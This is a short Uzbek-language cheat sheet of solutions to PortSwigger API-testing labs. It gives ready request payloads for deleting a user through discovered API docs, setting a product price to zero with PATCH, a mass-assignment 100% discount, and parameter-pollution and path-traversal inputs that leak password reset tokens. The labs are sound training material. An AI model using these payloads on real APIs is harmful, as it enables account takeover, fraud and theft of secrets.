# API Testing — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Test user: `wiener:peter`. Nishon: carlos'ni o'chirish yoki jacket'ni tekinga olish.
> Metod: API docs topish, `OPTIONS` bilan metodlarni ko'rish, mass assignment, parameter pollution.

### Exploiting API endpoint using documentation — APPRENTICE
Path'ni qisqartirib docs'ni topasan.
```
PATCH /api/user/wiener → /api/user → /api  (interaktiv docs)
→ docs'dagi DELETE operation → username=carlos
```

### Finding & exploiting unused API endpoint — APPRENTICE
`OPTIONS` ruxsat etilgan metodlarni ko'rsatadi → `PATCH` bilan narx.
```
OPTIONS /api/products/3/price   → Allow: GET, PATCH
PATCH /api/products/3/price   Content-Type: application/json
{"price":0}
```

### Mass assignment — PRACTITIONER
`GET /api/checkout` javobidagi `chosen_discount` ni `POST` body'ga qo'shasan.
```json
POST /api/checkout
{ ..., "chosen_discount": { "percentage": 100 } }
```

### Server-side parameter pollution — query string — PRACTITIONER
`POST /forgot-password` `username` ni backend query'ga qo'yadi → `%26`/`%23` bilan field inject.
```
username=administrator%26field=reset_token%23
```
> `%26`=`&`, `%23`=`#` (truncate). Javobda reset token leak.

### Server-side parameter pollution — REST URL — PRACTITIONER
`username` backend URL path'iga tushadi → traversal bilan docs topib, API versiyasini downgrade.
```
username=../../../../openapi.json%23        ← API docs topish
username=../../v1/users/administrator/field/passwordResetToken%23    ← v1 downgrade → token
```

---

### Eslatma
Doim tekshir: path qisqartirish (docs), `OPTIONS`, mass assignment (ortiqcha field), SSPP (`&`,`#`,`?`),
mualliflash metodlari. Chain: BOLA/IDOR, mass assignment → privilege. Himoya: strict schema, allowlist.
Umumiy: bu papka README.
